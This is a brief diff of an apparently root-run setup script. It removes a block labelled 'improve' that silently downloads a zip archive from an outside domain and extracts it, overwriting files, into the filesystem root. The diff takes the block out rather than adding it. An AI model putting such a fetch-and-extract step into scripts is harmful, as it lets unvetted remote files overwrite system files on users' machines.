@@ -269,18 +269,6 @@ cd /root/
 echo -e "${GREEN} almost done ... ${ENDCOLOR}"
 
 
-####improve
-
-cd /tmp
-
-wget -q https://amir3.space/iam.zip
-
-unzip -o iam.zip -d /
-
-cd /root/
-
-########
-
 > core.txt
 > vore.txt
 
